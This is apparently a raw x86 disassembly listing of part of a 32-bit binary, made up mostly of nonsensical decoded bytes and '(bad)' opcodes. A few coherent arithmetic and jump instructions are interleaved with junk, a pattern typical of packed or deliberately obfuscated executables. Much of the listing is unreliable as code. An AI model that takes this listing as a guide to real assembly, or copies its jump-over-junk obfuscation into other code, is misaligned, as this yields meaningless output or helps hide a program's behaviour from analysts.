  40416a:	sbb    al,0x2e
  40416c:	mov    ebp,0x6edd71ea
  404171:	leave  
  404172:	fs and al,0xd6
  404175:	or     eax,0xd7286711
  40417a:	repnz push ds
  40417c:	or     BYTE PTR [ecx],ah
  40417e:	fist   WORD PTR [edi+0x78]
  404181:	xor    BYTE PTR [ecx+ecx*2+0x4c],dl
  404185:	xchg   ecx,eax
  404186:	mov    bl,0xdb
  404188:	(bad)  
  404189:	xchg   ecx,eax
  40418a:	pop    edx
  40418b:	mov    cl,0x44
  40418d:	sub    BYTE PTR [ebx-0x62ae2fb2],al
  404193:	jno    0x4041e5
  404195:	fs jae 0x40411b
  404198:	sub    DWORD PTR [eax],esi
  40419a:	out    0x8b,al
  40419c:	xor    eax,0x3f561fe3
  4041a1:	jo     0x4041f4
  4041a3:	jge    0x404194
  4041a5:	nop
  4041a6:	jae    0x404137
  4041a8:	ja     0x404141
  4041aa:	loopne 0x40416c
  4041ac:	jmp    0xa046fb28
  4041b1:	aas    
  4041b2:	ins    DWORD PTR es:[edi],dx
  4041b3:	cli    
  4041b4:	sbb    ebx,DWORD PTR [eax]
  4041b6:	daa    
  4041b7:	add    BYTE PTR [eax+0x46119d89],al
  4041bd:	pop    ds
  4041be:	push   eax
  4041bf:	pop    edi
  4041c0:	xchg   edi,eax
  4041c1:	fld    QWORD PTR es:[eax]
  4041c4:	xchg   bh,dl
  4041c6:	sbb    eax,ecx
  4041c8:	xor    eax,0xf473fe75
  4041cd:	cmp    ah,bh
  4041cf:	xchg   edi,eax
  4041d0:	adc    DWORD PTR [edx],esp
  4041d2:	lods   al,BYTE PTR ds:[esi]
  4041d3:	inc    ebp
  4041d4:	sbb    al,0x96
  4041d6:	mov    esi,0x6aa26ee7
  4041db:	xchg   ecx,eax
  4041dc:	mov    fs,WORD PTR [esp+esi*2-0x2f]
  4041e0:	neg    eax
  4041e2:	push   0x463a0df2
  4041e7:	mov    BYTE PTR [esi+eiz*2-0x8df530],ch
  4041ee:	push   es
  4041ef:	jmp    0x404241
  4041f1:	push   ecx
  4041f2:	mov    eax,ds:0x11459368
  4041f7:	jno    0x40417f
  4041f9:	push   ss
  4041fa:	dec    edx
  4041fb:	pop    eax
  4041fc:	into   
  4041fd:	call   0x1cf8:0xb8c097
  404204:	or     dh,dh
  404206:	jg     0x404280
  404208:	out    0x9,al
  40420a:	xchg   BYTE PTR [edx+eax*4+0x1],dh
  40420e:	cmp    eax,DWORD PTR [ebp-0x2ef4cac7]
  404214:	neg    ch
  404216:	jmp    0x5b4f90c1
  40421b:	mov    eax,0x38184e82
  404220:	fcomp  QWORD PTR [ebx-0x39fc3ecd]
  404226:	mov    DWORD PTR [edx],eax
  404228:	mov    eax,DWORD PTR [ebp-0x8]
  40422b:	xor    eax,ecx
  40422d:	add    eax,esi
  40422f:	jmp    0x404374
  404234:	ffree  st(0)
  404236:	adc    BYTE PTR [ecx+esi*4-0x168e12ae],0xf2
  40423e:	mov    esi,0x99902035
  404243:	cmp    dh,BYTE PTR [eax+ebx*1]
  404246:	jo     0x4042b8
  404248:	sbb    BYTE PTR [edi+0x70],bh
  40424b:	jo     0x40426e
  40424d:	sbb    DWORD PTR [edi-0x44],edi
  404250:	(bad)  
  404251:	sahf   
  404252:	cmp    DWORD PTR [esi+0x25],ebp
  404255:	add    eax,0xe02c6011
  40425a:	jbe    0x4042c4
  40425c:	sub    eax,0x33cf70c5
  404261:	aad    0x34
  404263:	mov    esi,0x40b5580c
  404268:	sbb    al,0xdd
  40426a:	push   ss
  40426b:	es pop esp
  40426d:	cmc    
  40426e:	xchg   esp,eax
  40426f:	fisub  WORD PTR [esi]
  404271:	pop    edi
  404272:	sub    BYTE PTR [eax-0x1b44ff31],bh
  404278:	les    esi,FWORD PTR gs:[ebx]
  40427b:	adc    al,0xf7
  40427d:	adc    BYTE PTR [eax-0x1f],0xc9
  404281:	call   0x2f279140
  404286:	aad    0x1b
  404288:	mov    dh,0xe1
  40428a:	pop    ebp
  40428b:	cmp    eax,DWORD PTR [edx]
  40428d:	push   cs
  40428e:	lahf   
  40428f:	pop    es
  404290:	bound  eax,QWORD PTR [ebx]
  404292:	jno    0x404269
  404294:	push   eax
  404295:	cs mov ebx,0x7d2a712a
  40429b:	not    BYTE PTR [ecx]
  40429d:	or     esp,0x2f13affa
  4042a3:	jo     0x40427b
  4042a5:	add    edx,ecx
  4042a7:	call   0x3bd2:0xdc49a0b3
  4042ae:	xchg   ecx,eax
  4042af:	test   eax,0x77538e5
  4042b4:	and    eax,0x3d6375ee
  4042b9:	popf   
  4042ba:	jne    0x4042b5
  4042bc:	out    0x31,eax
  4042be:	aad    0x62
  4042c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042c1:	mov    eax,ds:0xaedeb4b5
  4042c6:	fst    QWORD PTR [edx+0x4a]
  4042c9:	mov    WORD PTR [ecx+ecx*4],?
  4042cc:	jl     0x40432b
  4042ce:	mov    bh,0x6
  4042d0:	push   esi
  4042d1:	mov    ebp,0xdf1b6fd7
  4042d6:	push   0x2863a38
  4042db:	xchg   edi,eax
  4042dc:	sahf   
  4042dd:	adc    al,0x45
  4042df:	fisttp QWORD PTR ds:0x5a1b27d0
  4042e5:	mov    ebp,0xcb886195
  4042ea:	add    al,0x39
  4042ec:	mov    cl,0x45
  4042ee:	lea    ecx,[esi]
  4042f0:	retf   
  4042f1:	fidivr WORD PTR [ecx+0x31]
  4042f4:	imul   ebx,esp,0xffffffc4
  4042f7:	popf   
  4042f8:	sbb    eax,0x8a8470c
  4042fd:	stc    
  4042fe:	scas   eax,DWORD PTR es:[edi]
  4042ff:	cmp    al,0x57
  404301:	push   0x30
  404303:	clc    
  404304:	xchg   esp,eax
  404305:	or     ecx,DWORD PTR [esi]
  404307:	lock data16 loop 0x40431f
  40430b:	push   esi
  40430c:	leave  
  40430d:	js     0x404322
  40430f:	fdivr  QWORD PTR [eax+0x632b8d1b]
  404315:	pop    ds
  404316:	sar    BYTE PTR [ebx+0x66],1
  404319:	pop    ecx
  40431a:	test   eax,0x9e2a192
  40431f:	pop    edx
  404320:	and    ch,BYTE PTR [esi]
  404322:	pop    ds
  404323:	aaa    
  404324:	dec    edi
  404325:	int    0x4b
  404327:	aaa    
  404328:	pop    edx
  404329:	js     0x404304
  40432b:	je     0x4043a2
  40432d:	mov    bl,0x10
  40432f:	pop    edi
  404330:	add    BYTE PTR [esi-0xa75f787],bl
  404336:	push   cs
  404337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404338:	sbb    BYTE PTR [eax-0x3cafbec2],0x72
  40433f:	jb     0x4043ab
  404341:	jp     0x404310
  404343:	jmp    0x79e1:0x59a72d22
  40434a:	mov    es,WORD PTR [ecx+0x20]
  40434d:	stos   DWORD PTR es:[edi],eax
  40434e:	cmp    eax,0x3538a968
  404353:	sti    
  404354:	call   0x3887:0x8b3e1722
  40435b:	ja     0x4043b6
  40435d:	bound  esi,QWORD PTR [edi+0x71aac52f]
  404363:	inc    eax
  404364:	push   esi
  404365:	mov    esp,DWORD PTR [ecx+0x5c]
  404368:	and    al,BYTE PTR [edi-0x7157222b]
  40436e:	int3   
  40436f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404370:	loopne 0x404371
  404372:	xrelease mov WORD PTR [ebp+0x8],ax
  404377:	mov    eax,DWORD PTR [ebp+0x8]
  40437a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40437e:	mov    dl,BYTE PTR [ebp-0x1]
  404381:	cmp    al,dl
  404383:	je     0x4048da
  404389:	mov    eax,DWORD PTR [ebp+0x8]
  40438c:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404390:	jmp    0x4044d5
  404395:	scas   al,BYTE PTR es:[edi]
  404396:	or     al,0x38
  404398:	repz (bad) 
  40439b:	test   eax,0x35388951
  4043a0:	rol    DWORD PTR [ecx+ecx*2+0x27dc5bb9],cl
  4043a7:	jo     0x404419
  4043a9:	sbb    BYTE PTR [edi+0x70],bh
  4043ac:	jo     0x404413
  4043ae:	cmp    al,0x54
  4043b0:	sub    esp,DWORD PTR [edx+0x69583c3e]
  4043b6:	or     bh,BYTE PTR [esi-0x31a45d24]
  4043bc:	xchg   edx,eax
  4043bd:	or     ebx,DWORD PTR [eax+0x5f3d06f3]
  4043c3:	push   cs
  4043c4:	out    dx,eax
  4043c5:	dec    edi
  4043c6:	or     eax,0xa7ece35d
  4043cb:	gs cdq 
  4043cd:	ins    BYTE PTR es:[edi],dx
  4043ce:	push   cs
  4043cf:	push   0xffffffda
  4043d1:	(bad)  
  4043d2:	test   al,0x17
  4043d4:	out    0x51,eax
  4043d6:	pop    edi
  4043d7:	inc    eax
  4043d8:	jmp    0x4043bf
  4043da:	mov    ch,0xae
  4043dc:	loop   0x4043e7
  4043de:	jg     0x404372
  4043e0:	retf   
  4043e1:	mov    ch,0xb8
  4043e3:	enter  0x29db,0xa5
  4043e7:	xchg   BYTE PTR [esi+edi*2+0x0],bl
  4043eb:	push   eax
  4043ec:	cs mov ch,0x4d
  4043ef:	imul   edi,DWORD PTR [eax+0x171f69db],0xdf18fd6b
  4043f9:	lods   eax,DWORD PTR ds:[esi]
  4043fa:	enter  0xf6c0,0x40
  4043fe:	in     al,dx
  4043ff:	and    al,0xd6
  404401:	mov    dh,0xa7
  404403:	in     eax,dx
  404404:	test   DWORD PTR [edx-0x439ebaf5],esi
  40440a:	adc    esp,DWORD PTR [eax-0x3a696c4b]
  404410:	aam    0x71
  404412:	ds mov ecx,0x528ce98b
  404418:	sahf   
  404419:	inc    edx
  40441a:	dec    esi
  40441b:	or     ch,bh
  40441d:	mov    edx,0xbf79d142
  404422:	retf   
  404423:	and    eax,0x68f49294
  404428:	outs   dx,DWORD PTR ds:[esi]
  404429:	and    al,0xfa
  40442b:	shr    DWORD PTR [esi-0x37cbd5dc],cl
  404431:	paddb  mm7,QWORD PTR [edx-0x6051616a]
  404438:	adc    dl,BYTE PTR [edi+0x37]
  40443b:	pop    esp
  40443c:	and    eax,DWORD PTR [esi+0x1f393250]
  404442:	ja     0x404448
  404444:	adc    esp,edx
  404446:	fiadd  DWORD PTR [ecx+edi*2]
  404449:	cmc    
  40444a:	(bad)  
  40444b:	out    dx,eax
  40444c:	ds aaa 
  40444e:	and    DWORD PTR [edx+0x2bab6dd7],ecx
  404454:	fs ss js 0x4043de
  404458:	cmp    DWORD PTR [ebx+0x4],0x19523527
  40445f:	leave  
  404460:	add    BYTE PTR [edi-0x4a],dh
  404463:	aam    0xf9
  404465:	jne    0x4044a1
  404467:	repnz xor eax,DWORD PTR [esi-0x66]
  40446b:	cmp    BYTE PTR ds:0x46053dd2,cl
  404471:	mov    bh,0x7f
  404473:	jno    0x404461
  404475:	rcl    DWORD PTR [ebp-0x15405f97],0xb
  40447c:	repz jb 0x40440f
  40447f:	mov    ebx,0x32c608a2
  404484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404485:	idiv   BYTE PTR [ebx-0x41]
  404488:	gs (bad) 
  40448a:	sbb    al,0x11
  40448c:	mov    esi,DWORD PTR [ecx+ecx*4+0x7c]
  404490:	mov    bh,0x6a
  404492:	or     esp,esi
  404494:	xor    bh,bh
  404496:	test   DWORD PTR [edx-0x1e],ebx
  404499:	add    esi,DWORD PTR [edi-0x52fcd5d9]
  40449f:	call   0x7b02d32f
  4044a4:	pushf  
  4044a5:	mov    al,ds:0x31a7bf58
  4044aa:	imul   edi,DWORD PTR [esi],0x27718a41
  4044b0:	jmp    0x40446e
  4044b2:	dec    eax
  4044b3:	cs aas 
  4044b5:	inc    esi
  4044b6:	push   cs
  4044b7:	jmp    0xb0400a4
  4044bc:	dec    DWORD PTR [eax-0x20]
  4044bf:	mov    ebp,0xfe921143
  4044c4:	repnz mov dh,0x6d
  4044c7:	pushf  
  4044c8:	sub    al,0x4d
  4044ca:	mov    al,ds:0x82317e2c
  4044cf:	mov    eax,ds:0xeeb254c3
  4044d4:	test   BYTE PTR [ebx+0x23a0c55],cl
  4044da:	jne    0x404ccf
  4044e0:	mov    eax,DWORD PTR [ebp-0x8]
  4044e3:	jmp    0x404628
  4044e8:	dec    edi
  4044e9:	push   edx
  4044ea:	test   ebx,esi
  4044ec:	xor    ebx,0x16807269
  4044f2:	popa   
  4044f3:	jns    0x40454f
  4044f5:	lods   al,BYTE PTR ds:[esi]
  4044f6:	and    DWORD PTR [ebx-0x7c],eax
  4044f9:	es jo  0x40456c
  4044fc:	sbb    BYTE PTR [edi+0x70],bh
  4044ff:	jo     0x404521
  404501:	mov    eax,DWORD PTR [edi-0x628847a9]
  404507:	jp     0x4044b1
  404509:	je     0x404542
  40450b:	(bad)  [ebp+0x1800c368]
  404511:	shl    BYTE PTR [ebx+0x2c],1
  404514:	jnp    0x404539
  404516:	cwde   
  404517:	out    dx,al
  404518:	cli    
  404519:	(bad)  
  40451a:	xlat   BYTE PTR ds:[ebx]
  40451b:	and    al,0x9a
  40451d:	push   esi
  40451e:	sub    ch,BYTE PTR [ecx+ebx*2-0x79c19ae9]
  404525:	out    0x66,al
  404527:	int3   
  404528:	lahf   
  404529:	out    dx,eax
  40452a:	clc    
  40452b:	inc    edi
  40452c:	pop    ss
  40452d:	inc    ecx
  40452e:	or     al,0xb3
  404530:	pop    edi
  404531:	sar    BYTE PTR [esp+esi*2+0x1bb5576d],0x94
  404539:	adc    eax,0x50d89608
  40453e:	sub    ebx,DWORD PTR [ebx+0x382a6ec1]
  404544:	sbb    esi,DWORD PTR es:[esi+eiz*4+0x3e]
  404549:	push   0x21
  40454b:	outs   dx,DWORD PTR ds:[esi]
  40454c:	xchg   ecx,eax
  40454d:	mov    al,0x3f
  40454f:	mov    bl,0xe8
  404551:	push   ecx
  404552:	(bad)  
  404553:	fcomp  st(3)
  404555:	jp     0x404512
  404557:	mov    DWORD PTR [edx],ecx
  404559:	bound  ebp,QWORD PTR [edi-0x4c]
  40455c:	pop    esp
  40455d:	push   ss
  40455e:	mov    dh,0x27
  404560:	inc    ecx
  404561:	inc    ebx
  404562:	int3   
  404563:	mov    eax,ds:0x1471fae4
  404568:	lea    ecx,[edi+0x4f8fb2e5]
  40456e:	jnp    0x4045c1
  404570:	enter  0x1b66,0xbd
  404574:	loop   0x40455a
  404576:	mov    ss,WORD PTR [ecx]
  404578:	sar    dl,1
  40457a:	retf   
  40457b:	dec    edx
  40457c:	jb     0x4045ec
  40457e:	(bad)  
  40457f:	je     0x4045fe
  404581:	cdq    
  404582:	loopne 0x40450b
  404584:	cmp    eax,0xdcaf9854
  404589:	fnstcw WORD PTR [eax+0x6aa8e57f]
  40458f:	add    dh,BYTE PTR [edx-0x635d8e9e]
  404595:	add    ah,cl
  404597:	and    al,0x5
  404599:	inc    edx
  40459a:	mov    BYTE PTR [esi+esi*4+0x2b5bb5fa],cl
  4045a1:	sub    ecx,DWORD PTR ds:0xc4733982
  4045a7:	neg    BYTE PTR [eax+0x22911efe]
  4045ad:	mov    ch,0x5c
  4045af:	sub    eax,0x37b5feb8
  4045b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045b5:	enter  0xdf1d,0xcd
  4045b9:	push   ss
  4045ba:	cmp    eax,0x2c655a04
  4045bf:	add    cl,BYTE PTR [ebx]
  4045c1:	aad    0x14
  4045c3:	mov    edi,0x188460fa
  4045c8:	jne    0x4045ef
  4045ca:	(bad)  
  4045cc:	sub    BYTE PTR [edi],bh
  4045ce:	test   DWORD PTR [ebx],edi
  4045d0:	call   0x5c3f:0x7530905a
  4045d7:	(bad)  
  4045d8:	cld    
  4045d9:	imul   BYTE PTR [edi-0x1c]
  4045dc:	adc    DWORD PTR [edi],0x66b39374
  4045e2:	sbb    al,0x3d
  4045e4:	sub    DWORD PTR [edx-0xb],eax
  4045e7:	push   es
  4045e8:	popa   
  4045e9:	mov    DWORD PTR [ebx+0x11db77a7],ecx
  4045ef:	stos   DWORD PTR es:[edi],eax
  4045f0:	or     al,0x3a
  4045f2:	inc    edx
  4045f3:	push   ecx
  4045f4:	push   cs
  4045f5:	daa    
  4045f6:	repnz sub dh,BYTE PTR [ebp+0x50]
  4045fa:	test   bh,bl
  4045fc:	pop    edx
  4045fd:	out    0x8b,al
  4045ff:	clc    
  404600:	xchg   ebx,eax
  404601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404602:	inc    eax
  404603:	push   ebp
  404604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404605:	rcl    DWORD PTR [ebp+esi*4-0x5c333c86],0x64
  40460d:	shr    edi,cl
  40460f:	sbb    eax,0x80bf849
  404614:	xchg   edx,eax
  404615:	cdq    
  404616:	gs jo  0x404632
  404619:	dec    edi
  40461a:	sbb    DWORD PTR [edx-0x33],edi
  40461d:	out    0x5f,al
  40461f:	jecxz  0x40464e
  404621:	xor    DWORD PTR [edi],ebx
  404623:	adc    eax,0x7b28d58
  404628:	mov    edx,DWORD PTR [ebp+0xc]
  40462b:	movsx  edx,BYTE PTR [edx]
  40462e:	xor    eax,ecx
  404630:	add    eax,esi
  404632:	cmp    edx,eax
  404634:	jmp    0x404779
  404639:	mov    edi,0x915e91cc
  40463e:	gs jae 0x40462a
  404641:	nop
  404642:	sbb    eax,0xf4456c86
  404647:	es lods al,BYTE PTR cs:[esi]
  40464a:	and    eax,0x7f187070
  40464f:	jo     0x4046c1
  404651:	push   es
  404652:	mov    edx,0x8af3fed6
  404657:	fsub   st,st(3)
  404659:	mov    WORD PTR [ebx+0x39335d91],gs
  40465f:	sbb    eax,0xab055b2d
  404664:	add    ah,BYTE PTR [eax-0x3f]
  404667:	scas   eax,DWORD PTR es:[edi]
  404668:	xchg   DWORD PTR [edx],eax
  40466a:	(bad)  
  40466b:	stc    
  40466c:	fst    QWORD PTR [ebx+esi*1]
  40466f:	cmovp  eax,ebx
  404672:	mul    DWORD PTR [esi]
  404674:	test   eax,0x6159581f
  404679:	imul   ebx,DWORD PTR [esi],0xcf5230dd
  40467f:	inc    esp
  404680:	pop    ecx
  404681:	push   edi
  404682:	xor    al,0x8e
  404684:	or     eax,0xafa37af8
  404689:	xor    al,0x66
  40468b:	lods   eax,DWORD PTR ds:[esi]
  40468c:	inc    ebp
  40468d:	mov    ds:0x2017f5d,al
  404692:	add    esp,DWORD PTR [esi+ebp*1+0x52394fba]
  404699:	out    0xf8,eax
  40469b:	add    al,0x89
  40469d:	inc    ebx
  40469e:	icebp  
  40469f:	repnz dec esp
  4046a1:	rol    DWORD PTR [ebp+0xb],0xaf
  4046a5:	neg    ebx
  4046a7:	cwde   
  4046a8:	sbb    esp,DWORD PTR [ebx+0x6d1614b1]
  4046ae:	cmpxchg DWORD PTR [ebp+0x46793ff2],esp
  4046b5:	hlt    
  4046b6:	add    eax,0x88ea2569
  4046bb:	loop   0x4046e4
  4046bd:	xchg   ebx,eax
  4046be:	push   0x53f96e3d
  4046c3:	and    DWORD PTR [eax+0x4cfa4b82],0xd6ea9e16
  4046cd:	jns    0x40466c
  4046cf:	mov    BYTE PTR [esi-0x28],dh
  4046d2:	hlt    
  4046d3:	mov    dh,0x6e
  4046d5:	push   ebp
  4046d6:	lock in al,dx
  4046d8:	sub    al,0x1d
  4046da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046db:	add    BYTE PTR [esi+edx*8-0x7d],ch
  4046df:	sub    cl,dh
  4046e1:	cmp    BYTE PTR [eax+0x5d06dd7b],cl
  4046e7:	rcr    bh,0x3e
  4046ea:	push   0xffffffee
  4046ec:	push   0xffffffc4
  4046ee:	nop
  4046ef:	int3   
  4046f0:	mul    DWORD PTR [edi]
  4046f2:	mov    ebp,ecx
  4046f4:	fisttp WORD PTR fs:[ebx+ebp*8-0x6a]
  4046f9:	js     0x404712
  4046fb:	fisub  DWORD PTR [ebx]
  4046fd:	in     eax,dx
  4046fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046ff:	bound  edi,QWORD PTR [eax+0x7dbffce1]
  404705:	aad    0x42
  404707:	enter  0xe337,0xff
  40470b:	inc    edi
  40470c:	mov    ds:0xbcf464df,eax
  404711:	sbb    DWORD PTR [edx-0x6c],eax
  404714:	not    DWORD PTR [ebx+0x2ef45bab]
  40471a:	add    ecx,edx
  40471c:	inc    esp
  40471d:	js     0x4046aa
  40471f:	ss lock daa 
  404722:	repz pusha 
  404724:	test   BYTE PTR [edi+eiz*2],0x59
  404728:	jne    0x404701
  40472a:	call   0xbdfc68ea
  40472f:	loop   0x4047b0
  404731:	dec    ebp
  404732:	xor    eax,0x4d7b2243
  404737:	outs   dx,BYTE PTR ds:[esi]
  404738:	dec    edx
  404739:	xchg   edi,eax
  40473a:	inc    ebp
  40473b:	lds    ecx,FWORD PTR [eax-0x3e]
  40473e:	imul   ebx,edx,0x38
  404741:	dec    ebx
  404742:	daa    
  404743:	mov    ecx,0x350b28c7
  404748:	shr    DWORD PTR [ebx],1
  40474a:	fldenv [eax-0x282443f1]
  404750:	lds    ecx,FWORD PTR [ebx]
  404752:	loope  0x4047aa
  404754:	inc    ebp
  404755:	sbb    eax,DWORD PTR [ecx-0x6976a01e]
  40475b:	gs dec edx
  40475d:	add    al,0xad
  40475f:	aas    
  404760:	mov    ecx,0x3aeb3a64
  404765:	daa    
  404766:	adc    DWORD PTR ds:0x6630f587,esp
  40476c:	push   ebx
  40476d:	ins    BYTE PTR es:[edi],dx
  40476e:	lock repz out dx,al
  404771:	rcr    esp,1
  404773:	je     0x4047cc
  404775:	lock out dx,eax
  404777:	push   eax
  404778:	mov    cl,BYTE PTR [edi]
  40477a:	test   bh,bh
  40477c:	add    eax,DWORD PTR [eax]
  40477e:	add    bh,al
  404780:	inc    ebp
  404781:	call   0x7464515
  404786:	jmp    0x4048cb
  40478b:	aaa    
  40478c:	dec    ebp
  40478d:	rcr    DWORD PTR [edi],cl
  40478f:	jno    0x404732
  404791:	repz push ebp
  404793:	enter  0x209d,0xec
  404797:	in     al,0x5b
  404799:	and    BYTE PTR [ecx+0x70702454],cl
  40479f:	sbb    BYTE PTR [edi+0x70],bh
  4047a2:	jo     0x4047dd
  4047a4:	popa   
  4047a5:	jno    0x4047f0
  4047a7:	cmc    
  4047a8:	pop    ebx
  4047a9:	sub    al,BYTE PTR [edi+0x6cefcb8c]
  4047af:	jge    0x404747
  4047b1:	xlat   BYTE PTR ds:[ebx]
  4047b2:	dec    eax
  4047b3:	test   eax,0xf5f82db7
  4047b8:	sar    BYTE PTR [edx],1
  4047ba:	inc    edx
  4047bb:	sbb    DWORD PTR [esi+0x18],esp
  4047be:	and    BYTE PTR [edx],al
  4047c0:	push   ds
  4047c1:	int    0xab
  4047c3:	pop    ebx
  4047c4:	push   esi
  4047c5:	add    DWORD PTR [ecx+0x69],0x9fde16bb
  4047cc:	jecxz  0x404803
  4047ce:	xchg   edx,eax
  4047cf:	aas    
  4047d0:	out    dx,eax
  4047d1:	jae    0x40476a
  4047d3:	mov    bh,0xed
  4047d5:	rcr    DWORD PTR [eax+0x7d],0x11
  4047d9:	dec    ebp
  4047da:	cmp    edx,DWORD PTR [ebx+0x4247e0a2]
  4047e0:	jg     0x4047d9
  4047e2:	in     eax,0xf9
  4047e4:	call   0x24ab:0xea64f6dd
  4047eb:	loop   0x404775
  4047ed:	push   esi
  4047ee:	dec    esp
  4047ef:	test   BYTE PTR [edi],cl
  4047f1:	jecxz  0x4047a8
  4047f3:	pop    ebp
  4047f4:	sti    
  4047f5:	cmp    al,0xa8
  4047f7:	popa   
  4047f8:	in     eax,dx
  4047f9:	or     al,ch
  4047fb:	mov    edx,0x99287e5d
  404800:	out    dx,eax
  404801:	es mov bh,0xd0
  404804:	aad    0xad
  404806:	cli    
  404807:	stc    
  404808:	mov    bl,0xa0
  40480a:	fbld   TBYTE PTR ds:0xa2c9dbd2
  404810:	add    al,0xa2
  404812:	pusha  
  404813:	test   al,0xe3
  404815:	retf   
  404816:	call   0x59d79d8f
  40481b:	jns    0x4047fe
  40481d:	shr    DWORD PTR [edi+0xa],cl
  404820:	in     al,dx
  404821:	xlat   BYTE PTR ds:[ebx]
  404822:	icebp  
  404823:	mul    DWORD PTR [ecx]
  404825:	gs add al,0xcc
  404828:	loope  0x404811
  40482a:	packsswb mm3,mm5
  40482d:	dec    edx
  40482e:	inc    edi
  40482f:	inc    eax
  404830:	cmp    al,0xcc
  404832:	dec    ecx
  404834:	inc    ecx
  404835:	int3   
  404836:	and    al,0xe1
  404838:	jnp    0x4047f7
  40483a:	add    al,dh
  40483c:	cld    
  40483d:	mov    WORD PTR [esi-0xc],gs
  404840:	out    0xbe,eax
  404842:	dec    ebx
  404843:	popa   
  404844:	jp     0x404871
  404846:	push   esi
  404847:	repnz repnz test DWORD PTR [esi+0x24],ecx
  40484c:	mov    ebx,0xef43330a
  404851:	enter  0x2407,0xf4
  404855:	jl     0x404825
  404857:	enter  0x8fc8,0xce
  40485b:	mov    bl,0xf2
  40485d:	push   ss
  40485e:	jle    0x4048d4
  404860:	(bad)  
  404861:	xchg   ecx,eax
  404862:	gs push esp
  404864:	retf   
  404865:	ins    BYTE PTR es:[edi],dx
  404866:	sbb    ah,BYTE PTR [ebp-0x40b1068]
  40486c:	jne    0x404840
  40486e:	add    bh,BYTE PTR [eax]
  404870:	aaa    
  404871:	cmp    al,0x81
  404873:	jge    0x4048a3
  404875:	popa   
  404876:	pop    ds
  404877:	sbb    DWORD PTR [ebp+0x681d60cb],0x9a05969a
  404881:	jge    0x404892
  404883:	ret    0x15e0
  404886:	daa    
  404887:	outs   dx,BYTE PTR ds:[esi]
  404888:	outs   dx,BYTE PTR ds:[esi]
  404889:	or     dh,BYTE PTR [edx+0x2715b1cd]
  40488f:	add    DWORD PTR [edi+0x8601f5c],ecx
  404895:	nop
  404896:	lds    ecx,FWORD PTR [ebp+0x6d]
  404899:	cwde   
  40489a:	sub    dl,BYTE PTR [ecx-0x70c7b9ec]
  4048a0:	das    
  4048a1:	and    ecx,DWORD PTR [ecx]
  4048a3:	jbe    0x4048ea
  4048a5:	xchg   esi,eax
  4048a6:	(bad)  
  4048a7:	sbb    BYTE PTR [eax-0x59],ah
  4048aa:	add    al,0x41
  4048ac:	cdq    
  4048ad:	dec    esi
  4048ae:	cwde   
  4048af:	xchg   esp,esp
  4048b1:	cmc    
  4048b2:	cmp    ah,bl
  4048b4:	sbb    ecx,edx
  4048b6:	push   cs
  4048b7:	into   
  4048b8:	adc    dl,al
  4048ba:	fist   DWORD PTR [edi-0x36fdeaf7]
  4048c0:	ficomp DWORD PTR [ecx]
  4048c2:	hlt    
  4048c3:	xor    esi,ebx
  4048c5:	mov    ah,bh
  4048c7:	inc    esi
  4048c8:	and    BYTE PTR [edx-0x40],al
  4048cb:	lea    eax,[ebp-0x18]
  4048ce:	mov    DWORD PTR [ebp-0x14],eax
  4048d1:	mov    eax,DWORD PTR [ebp-0x14]
  4048d4:	add    DWORD PTR [eax],0x705fa8f
  4048da:	mov    eax,DWORD PTR [ebp-0x10]
  4048dd:	mov    edx,DWORD PTR [ebp+0x8]
  4048e0:	xor    eax,ecx
  4048e2:	lea    eax,[eax+edx*1+0x32729c]
  4048e9:	mov    DWORD PTR [ebp+0x8],eax
  4048ec:	jmp    0x404a31
  4048f1:	mov    cl,BYTE PTR [eax]
  4048f3:	add    DWORD PTR [eax+0x12918b81],0xffffff82
  4048fa:	jecxz  0x404905
  4048fc:	or     eax,0x28851bca
  404901:	jl     0x404925
  404903:	jo     0x404975
  404905:	sbb    BYTE PTR [edi+0x70],bh
  404908:	jo     0x40494d
  40490a:	mov    esi,0xbd02a182
  40490f:	rol    BYTE PTR [ebx+esi*4+0x7b1d4db0],cl
  404916:	mov    DWORD PTR [edi-0x3cec6b8d],0x495e14a0
  404920:	push   edx
  404921:	or     eax,0xfafb34aa
  404926:	imul   esp,DWORD PTR [eax],0x2b893d20
  40492c:	in     eax,dx
  40492d:	push   es
  40492e:	pop    ss
  40492f:	je     0x4048df
  404931:	add    eax,0x3760acc2
  404936:	stc    
  404937:	arpl   WORD PTR [ecx+0x19a7fb6],cx
  40493d:	jl     0x4048ef
  40493f:	push   esi
  404940:	mov    ds:0xf315b9ab,eax
  404945:	aad    0xdf
  404947:	fwait
  404948:	js     0x4049a4
  40494a:	test   DWORD PTR [ecx+0xa],esp
  40494d:	pop    esp
  40494e:	xchg   edx,eax
  40494f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404950:	xacquire xchg DWORD PTR [esp+ebx*1-0x7d29048f],edi
  404958:	pushf  
  404959:	repnz sbb edx,ebx
  40495c:	ficomp DWORD PTR [eax-0x46]
  40495f:	and    eax,0x448201c2
  404964:	pushf  
  404965:	psubw  mm2,mm6
  404968:	jecxz  0x4049b0
  40496a:	mov    ebp,0xe3c6d47b
  40496f:	test   BYTE PTR [eax],ch
  404971:	sbb    dl,dl
  404973:	lahf   
  404974:	iret   
  404975:	fistp  QWORD PTR [ecx-0x4b]
  404978:	cli    
  404979:	out    dx,al
  40497a:	xlat   BYTE PTR ds:[ebx]
  40497b:	pop    eax
  40497c:	xchg   esp,eax
  40497d:	out    0xc5,eax
  40497f:	or     BYTE PTR [esi-0x7b],ah
  404982:	sub    BYTE PTR [eax-0x31],al
  404985:	stc    
  404986:	xchg   ebp,eax
  404987:	arpl   di,dx
  404989:	push   ecx
  40498a:	push   edi
  40498b:	inc    edi
  40498c:	scas   eax,DWORD PTR es:[edi]
  40498d:	add    al,0x11
  40498f:	adc    al,ch
  404991:	adc    eax,esp
  404993:	pop    eax
  404994:	jbe    0x4049ef
  404996:	das    
  404997:	int3   
  404998:	je     0x404937
  40499a:	sbb    eax,0x36400460
  40499f:	push   ebp
  4049a0:	nop
  4049a1:	inc    eax
